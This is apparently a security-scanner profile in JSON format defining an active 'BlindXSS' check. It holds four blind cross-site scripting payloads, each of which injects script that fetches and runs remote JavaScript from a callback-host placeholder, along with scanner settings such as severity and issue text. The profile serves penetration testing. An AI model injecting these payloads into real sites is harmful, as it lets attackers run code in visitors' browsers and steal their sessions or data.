[{"Name":"BlindXSS","Active":true,"Scanner":1,"Author":"@egarme","Payloads":["\u003cscript\u003e$.getScript(\"//{BC}\")\u003c/script\u003e","javascript:eval(\u0027var a\u003ddocument.createElement(\\\u0027script\\\u0027);a.src\u003d\\\u0027https://{BC}\\\u0027;document.body.appendChild(a)\u0027)","\u003cscript\u003efunction b(){eval(this.responseText)};a\u003dnew XMLHttpRequest();a.addEventListener(\"load\",\n\n\n\n\n\n\n b);a.open(\"GET\",\n\n\n\n\n\n\n \"//{BC}\");a.send();\u003c/script\u003e","\"\u003e\u003cscript src\u003dhttp://{BC}\u003e\u003c/script\u003e"],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":[],"Tags":["XSS"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"MatchType":0,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"BlindXSS","IssueSeverity":"High","IssueConfidence":"Tentative","IssueDetail":"Blind XSS found with payload \u003cgrep\u003e","RemediationDetail":"","IssueBackground":"","RemediationBackground":""}]